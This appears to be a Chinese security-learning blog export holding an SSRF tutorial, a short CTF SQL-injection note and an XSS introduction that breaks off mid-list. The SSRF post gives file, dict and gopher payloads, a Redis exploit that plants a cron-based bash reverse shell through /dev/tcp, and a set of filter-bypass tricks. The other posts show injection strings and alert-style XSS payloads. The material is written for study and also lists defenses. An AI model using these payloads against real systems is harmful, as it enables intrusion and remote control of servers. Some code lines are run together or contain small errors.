<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h2><p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。<br>curl_exec — 执行 cURL 会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl_exec(resource $ch): mixed</span><br></pre></td></tr></table></figure>
<p>执行给定的 cURL 会话。<br>这个函数应该在初始化一个 cURL 会话并且全部的选项都被设置后被调用。<br>成功时返回 true， 或者在失败时返回 false。 然而，如果 设置了 CURLOPT_RETURNTRANSFER 选项，函数执行成功时会返回执行的结果，失败时返回 false 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();  <span class="comment">// 创建新的cURL资源</span></span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_URL, <span class="variable">$link</span>);</span><br><span class="line">	<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_OPTRETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 抓取URL并把它传给浏览器</span></span><br><span class="line">	<span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line">	<span class="comment">// file_put_content($filename, $result);</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$result</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_5.png" alt=" "></p>
<h1 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h1><p>SSRF漏洞的利用所涉及的协议有：</p>
<ul>
<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
<li>http&#x2F;s协议：探测内网主机存活</li>
</ul>
<h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>payload的利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///etc/password # file:// 之后可以接任意文件</span><br></pre></td></tr></table></figure>
<p>这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/index.php?url=file:///etc/password</span><br></pre></td></tr></table></figure>

<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>探测一下内网活着的主机（但是很多不会开Http协议，没多大用）<br>抓一下包，在Burp里面探测一下就行</p>
<h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://ip/info 可获取本地redis服务配置信息</span><br></pre></td></tr></table></figure>
<p>如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server</p>
<h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；<br>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。<br>gopher协议在各个编程语言中的限制：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php  	--write-curlwrappers且php版本至少为5.3</span><br><span class="line">—wite-curlwrappers选项含义：运用curl工具打开url流</span><br><span class="line">curl使用curl —version查看版本以及支持的协议</span><br><span class="line">Java	小于JDK1.7</span><br><span class="line">Curl 	低版本不支持</span><br><span class="line">Perl 	支持</span><br><span class="line">ASP.NET 小于版本3</span><br></pre></td></tr></table></figure>
<p>Curl的所需参数是一个URL，即URLEncode后的链接（重点）</p>
<ul>
<li>格式：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">gopher的默认端口是70</span><br><span class="line">如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码（详细注意事项见下）</span><br></pre></td></tr></table></figure>
gopher发送get请求</li>
<li>问号（?）需要转码为URL编码，也就是%3f</li>
<li>回车换行要变为%0d%0a，但如果直接用工具转，可能只会有%0a</li>
<li>在HTTP包的最后要加上%0d%0a，代表消息结束（具体可研究HTTP包结束）<br>可直接转换的脚本：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import reimport urllib.parsedata=\    &#x27;&#x27;&#x27;GET /try.php?a=Wan&amp;b=Zifeng HTTP/1.1Host: 192.168.0.130:8201Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&#x27;&#x27;&#x27;data=urllib.parse.quote(data)strinfo=re.compile(&#x27;%0A&#x27;,re.I)new=strinfo.sub(&#x27;%0D%0A&#x27;,data)new=&#x27;gopher://192.168.0.130:8201/_&#x27;+new+&#x27;%0D%0A&#x27;new=urllib.parse.quote(new)with open(&#x27;Result.txt&#x27;,&#x27;w&#x27;) as f:    f.write(new)with open(&#x27;Result.txt&#x27;,&#x27;r&#x27;) as f:    for line in f.readlines():        print(line.strip())</span><br></pre></td></tr></table></figure>
因为Burp是抓取浏览器URLEncode编码后的数据，所以我们得对整个gopher协议进行二次编码<br>这样到达服务器一次解码得到的就是<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://192.168.0.130:8201/_GET%20/try.php%3Fa%3DWan%26b%3DZifeng%20HTTP/1.1%0D%0AHost%3A%20192.168.0.130%3A8201%0D%0ACache-Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20×64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/92.0.4515.159%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0A</span><br></pre></td></tr></table></figure>
这样就是可以正常解析的URL（Gopher发送的TCP数据流要求是URLEncode后的，毕竟是伪协议嘛），丢给Curl函数执行完事</li>
</ul>
<p>gopher发送post请求<br>和get请求一样，放入脚本编码后即可放入url中。<br>post请求：如果是Content-type为application&#x2F;x-www-form-urlencoded，那么POST数据也应进行二次编码（该选项含义就是URL编码后的数据）</p>
<p>使用注意事项</p>
<ul>
<li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li>
<li>file_get_contents 的 gopher 协议不能 URLencode</li>
<li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li>
<li>PHP 的 curl 默认不 follow 302 跳转</li>
<li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li>
</ul>
<p><a href="https://www.anquanke.com/post/id/262430#h3-5">gopher协议</a></p>
<h2 id="Redis未授权攻击"><a href="#Redis未授权攻击" class="headerlink" title="Redis未授权攻击"></a>Redis未授权攻击</h2><p>常用redis命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure>
<p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于Gopher协议的 URL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span><br></pre></td></tr></table></figure>
<p>经过url解码便是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit</span><br></pre></td></tr></table></figure>



<h1 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><p>URL的完整格式是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span><br></pre></td></tr></table></figure>
<p>所以访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=”http://baidu.com@1.1.1.1″”&gt;http://baidu.com@1.1.1.1</span><br><span class="line">和</span><br><span class="line">http://1.1.1.1</span><br><span class="line">效果相同，因为解析的本来就是@后面的服务器地址</span><br></pre></td></tr></table></figure>

<h2 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h2><p>以PHP为例，一般后端用正则匹配IP长这个样子:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$str = &#x27;&#x27;;$isMatched = preg_match_all(&#x27;/((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;, $str, $matches);var_dump($isMatched, $matches);</span><br></pre></td></tr></table></figure>
<p>所以可以换成各种进制进行绕过:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符串:       10.0.0.3</span><br><span class="line">二进制:       00001010 . 00000000 . 00000000 . 00000011</span><br><span class="line">十六进制:    0A.00.00.03</span><br><span class="line">整数:           167772163</span><br></pre></td></tr></table></figure>
<p>这些表达方式都能被curl命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用 16 进制0x0A000003表示IP地址，还有一个很少人知道的绕过小姿势，就是用 8 进制代替 10 进制来表示 IP 地址。在计算机的世界里，一旦在20前面加个0就会变成8进制，比如<code>http://01200000003实际上还是http://10.0.0.3</code><br>上面两个表达方式，PHP 的 curl 模块能解析出来。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">十六进制：   http://0x0A.0x00.0x00.0x03</span><br><span class="line">八进制：       http://012.00.00.03</span><br><span class="line">八进制溢出：http://265.0.0.3</span><br></pre></td></tr></table></figure>

<h2 id="重定向绕过-amp-短网址绕过"><a href="#重定向绕过-amp-短网址绕过" class="headerlink" title="重定向绕过&amp;短网址绕过"></a>重定向绕过&amp;短网址绕过</h2><p>一般来说，PHP里的重定向长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpfunction redirect($url)&#123;    header(&quot;Location: $url&quot;);    exit();&#125;</span><br></pre></td></tr></table></figure>
<p>如果192.168.0.1.xip.io都被过滤了，但是重定向没有被控制；你可以去<strong>TINYURL</strong>生成一个短URL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问短URL的流程就是</span><br><span class="line">https://tinyurl.com/4czmrv9d-&gt;302跳转-&gt;成功访问192.168.0.1</span><br><span class="line">这样就成功绕过了检查</span><br></pre></td></tr></table></figure>

<h2 id="冷门协议绕过"><a href="#冷门协议绕过" class="headerlink" title="冷门协议绕过"></a>冷门协议绕过</h2><p>如果是php，可以试试php所有的伪协议以及冷门的非HTTP协议：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://系列zip:// &amp; bzip2:// &amp; zlib://系列data://phar://file:///dict://sftp://ftp://tftp://ldap://gopher://</span><br></pre></td></tr></table></figure>

<h2 id="特殊用法绕过"><a href="#特殊用法绕过" class="headerlink" title="特殊用法绕过"></a>特殊用法绕过</h2><p>下面这俩可以试试绕过127.0.0.1:80，不一定有效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[::]:80/ http://0000::1:80/http://0/</span><br></pre></td></tr></table></figure>
<p>中文句号也可以试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192。168。0。1</span><br></pre></td></tr></table></figure>

<h2 id="xip-io和xip-name"><a href="#xip-io和xip-name" class="headerlink" title="xip.io和xip.name"></a>xip.io和xip.name</h2><p><strong>xip.io</strong> 是一个提供通配符 DNS 解析的魔法域名。你可以无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。<br><strong>xip.name</strong> 是受 xip.io 启发，使用 Golang 开发的一个支持通配符的 DNS 服务器。<br><a href="https://cloud.tencent.com/developer/article/1825757">详细解释</a></p>
<h2 id="利用IPv6"><a href="#利用IPv6" class="headerlink" title="利用IPv6"></a>利用IPv6</h2><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::] 0000::1</code> 或IPv6的内网域名来绕过过滤。</p>
<h2 id="利用IDN"><a href="#利用IDN" class="headerlink" title="利用IDN"></a>利用IDN</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。<br>在这些字符中，部分字符会在访问时做一个等价转换。<br>可在该网站挑选合适的字符进行替代：<a href="https://www.mp51.vip/Code/AllUniCode?quwei=2460-24FF">替代字符</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ⓌⓌⓌ.ⓑⓐⓘⓓⓤ.ⓒⓞⓜ 完全等价于 https://www.baidu.com</span><br></pre></td></tr></table></figure>
<p>当然，适用于域名而不适用与直接IP访问</p>
<h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。</p>
<ul>
<li>判定逻辑：<br>判定所给的IP或者域名解析后的IP是否在黑名单中<br>若在，退出报错<br>若不在，再次访问所给的IP或者域名解析后的IP；执行后续业务模块<br>所以思路很简单：只需要有个域名，但是它映射两个IP；同时设置TTL为0，能方便两个IP即刻切换<br>效果类比：访问wwfcww.xyz这个域名，第一次解析的IP是192.168.0.1；而第二次解析的IP是127.0.0.1<br>这个操作，就叫做DNS重绑定，如此一来便可进行SSRF攻击。</li>
</ul>
<h1 id="SSRF的防御"><a href="#SSRF的防御" class="headerlink" title="SSRF的防御"></a>SSRF的防御</h1><ul>
<li>限制协议<br>仅允许http&#x2F;https请求</li>
<li>限制IP<br>避免应用被用来获取内网数据，攻击内网</li>
<li>限制端口<br>限制请求的端口为http常用的端口，比如80, 443, 8080, 8090</li>
<li>过滤返回信息<br>验证远程服务器对请求的响应是比较简单的方法</li>
<li>统一错误信息<br>避免用户可以根据错误信息来判断远端服务器的端口状态</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>仍然有很多不太清晰的地方，主要在协议和DNS重定向方面。以后刷题来弥补吧。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF</a><br><a href="https://www.anquanke.com/post/id/262430">学习一年的SSRF总结</a></p>
]]></content>
      <categories>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW_web入门_SQL注入</title>
    <url>/2022/12/13/ctfshow_web%E5%85%A5%E9%97%A8_SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<span id="more"></span>
<p>web172<br>打开F12，发现js，访问后，发现最后几行代码有关于输入的部分，于是随手输入一个：<br><code>url/api/?id=1</code><br>发现显示出数据，于是先构造一个：<br><code>url/api/?id=1&#39;or 1=1 --+</code><br>得到全部数据，但我们翻到最下面，显示flag不在这里，那说明flag应该是在另一个表里，于是进行常规注入，最后在ctfshow_user2的表里发现了flag。
 </p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <url>/2022/12/02/XSS/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到了XSS，来这一关之前把js重学了一遍，又把千锋关于XSS的视频也看了一遍，至此才敢写下这篇。</p>
<span id="more"></span>
<h1 id="XSS-漏洞概述"><a href="#XSS-漏洞概述" class="headerlink" title="XSS 漏洞概述"></a>XSS 漏洞概述</h1><h2 id="XSS-简单介绍"><a href="#XSS-简单介绍" class="headerlink" title="XSS 简单介绍"></a>XSS 简单介绍</h2><p>XSS又名CSS(Cross Site Scripting)，即跨站脚本攻击。<br>XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。在留言板，聊天室等收集用户输入的地方，只要没有对用户输入进行严格过滤，都有可能被注入XSS代码。<br>从上述内容可知，XSS属于客户端攻击，受害者最终是用户。XSS也可以攻击服务器端，攻击者可能靠管理员身份作为跳板实施攻击。</p>
<h2 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h2><p>产生层面一般是在前端，JS代码能干什么，执行之后就会达到相应的效果</p>
<h2 id="函数类"><a href="#函数类" class="headerlink" title="函数类"></a>函数类</h2><p>比如php中的脚本的输出函数<br>常见的输出函数有：<code>print, print_r, echo, printf, sprintf, die, var_dump, var_export</code></p>
<h2 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h2><p>XSS利用JS代码实现攻击，有很多方法，以下列出常见几种：</p>
<ul>
<li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗窃企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其它网站发起攻击</li>
<li>刷流量，执行弹窗广告</li>
</ul>
<h2 id="浏览器内核"><a href="#浏览器内核" class="headerlink" title="浏览器内核"></a>浏览器内核</h2><p>利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
<h2 id="XSS-漏洞的验证"><a href="#XSS-漏洞的验证" class="headerlink" title="XSS 漏洞的验证"></a>XSS 漏洞的验证</h2><p>可以用一段简单的代码，检测和验证漏洞的存在，这样的代码叫做PoC(Proof of Concept)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PoC          漏洞的验证与检测</span><br><span class="line">EXP          漏洞的完整利用工具</span><br><span class="line">shellcode    利用漏洞时所执行的代码</span><br><span class="line">payload      攻击载荷 -sqlmap中是攻击代码的模板  -msf中与shellcode类似，功能是建立与目标的连接</span><br><span class="line">验证XSS 漏洞存在的PoC如下</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;   常用</span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS-攻击分类"><a href="#XSS-攻击分类" class="headerlink" title="XSS 攻击分类"></a>XSS 攻击分类</h2><h3 id="来自内部的攻击"><a href="#来自内部的攻击" class="headerlink" title="来自内部的攻击"></a>来自内部的攻击</h3><p>利用程序自身的漏洞，构造跨站语句。如：dvbbs的showerror.asp存在的跨站漏洞。</p>
<h3 id="来自外部的攻击"><a href="#来自外部的攻击" class="headerlink" title="来自外部的攻击"></a>来自外部的攻击</h3><p>主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
<h1 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h1><p>XSS漏洞可以分为三个类型：反射型XSS，存储型XSS，DOM型XSS</p>
<h2 id="反射型-非持久化"><a href="#反射型-非持久化" class="headerlink" title="反射型(非持久化)"></a>反射型(非持久化)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>反射型XSS是非持久性，参数型的跨站脚本。是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞<br>反射型XSS的JS代码在Web应用的参数(变量)中，如搜索框的反射型XSS。</p>
<h3 id="判断是否存在反射型XSS漏洞并利用"><a href="#判断是否存在反射型XSS漏洞并利用" class="headerlink" title="判断是否存在反射型XSS漏洞并利用"></a>判断是否存在反射型XSS漏洞并利用</h3><ol>
<li>判断有没有一些特殊字符<br>按照没有被过滤的字符进行代码构造。</li>
<li>注入代码<br>查看源代码进一步完善代码构造并尝试注入。</li>
<li>插入代码</li>
<li>利用XSS漏洞</li>
</ol>
<h2 id="存储型-持久化"><a href="#存储型-持久化" class="headerlink" title="存储型(持久化)"></a>存储型(持久化)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>存储型XSS是持久性跨站脚本。持久性体现在XSS代码不是在某个参数(变量)中，而是写入数据库或文件等可以永久保存的介质中。最典型的例子就是留言板XSS，攻击者提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。<br><img src="/simg/xss_1.png" alt="存储型"></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>注入后重新刷新发现直接回显注入的东西，说明是存储型xss</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分<br>DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，触发XSS靠的是浏览器的DOM解析，完全是客户端的事情。<br>DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。<br>基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="XSS-的构造"><a href="#XSS-的构造" class="headerlink" title="XSS 的构造"></a>XSS 的构造</h1><h2 id="利用-lt-gt-构造HTML-JS"><a href="#利用-lt-gt-构造HTML-JS" class="headerlink" title="利用&lt;&gt;构造HTML/JS"></a>利用&lt;&gt;构造HTML/JS</h2><pre><code>可以利用&lt;&gt;构造HTML标签和&lt;script&gt;标签
在测试页面提交参数 &lt;h1 style=&#39;color:red&#39;&gt;111&lt;/h1&gt;
提交 &lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>可以使用javascript:伪协议的方式构造XSS，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(/xss/)        						在Edge浏览器URL中输入该代码能够运行</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     点击超链接即可触发XSS</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>            		IE6下测试成功</span><br></pre></td></tr></table></figure>

<h2 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h2><p>“事件驱动”是一种比较经典的编程思想。在网页中发生的事件（如：鼠标移动点击，键盘输入等），JS可以对这些事件进行响应。因此可通过事件触发JS函数，触发XSS。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">事件种类</span><br><span class="line">windows 事件  		对windows 对象触发的事件</span><br><span class="line">form 事件 			HTML表单内的动作触发事件</span><br><span class="line">Keyboard 事件 		键盘按键</span><br><span class="line">Mouse 事件 			由鼠标类似用户动作触发的事件</span><br><span class="line">Media 事件 			由多媒体触发的事件</span><br></pre></td></tr></table></figure>
<p>比如：</p>
